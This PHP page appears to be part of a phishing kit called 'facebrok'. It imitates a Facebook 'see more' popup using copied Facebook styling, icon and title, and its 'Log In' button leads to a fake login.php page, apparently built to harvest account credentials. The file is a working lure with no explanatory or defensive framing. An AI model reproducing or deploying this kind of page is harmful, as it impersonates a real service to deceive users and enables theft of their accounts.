<?php

	include '../croak/core.function.php';
	$facebrok = new facebrok();
	$facebrok->error_disable();

?>
<link type="text/css" rel="stylesheet" href="../dynamic/IP2jlxIk72s.css" data-bootloader-hash="NXByC" crossorigin="anonymous" />
<link type="text/css" rel="stylesheet" href="../dynamic/5oUDzdfWqHK2.css" data-bootloader-hash="NXByC" crossorigin="anonymous" /> 

<style>
    * {
      margin: 0; padding: 0;
    }
    
    html { 
      background: url(../dynamic/pop_see_more.png) no-repeat center center fixed; 
      -webkit-background-size: cover;
      -moz-background-size: cover;
      -o-background-size: cover;
      background-size: cover;
    }
</style>
<title>nickimaj | Facebook</title>
<link rel="shortcut icon" href="../dynamic/índice.ico" />
<div class="_4-u2 _5hni _4-u8" id="u_0_5p" style="display: block;"><div class="_5hnk"><div class="_5hnl"><div class="_5hnm"><?php echo $facebrok->translater("see_nickimaj"); ?></div><div class="_5hnp"><?php echo $facebrok->translater("msg_nickimaj"); ?></div></div><br><div class="_5hnq"><a class="_42ft _4jy0 _4jy5 _517h _51sy" role="button" style=""><?php echo $facebrok->translater("sign_up"); ?></a><a class="_42ft _4jy0 _4jy5 _4jy1 selected _51sy" role="button" href="../login.php?login_attempt=1&lwv=1"><?php echo $facebrok->translater("log_in"); ?></a></div><a class="_3j0u" data-nocookies="1" id="u_0_5r"><?php echo $facebrok->translater("not_now"); ?></a></div></div>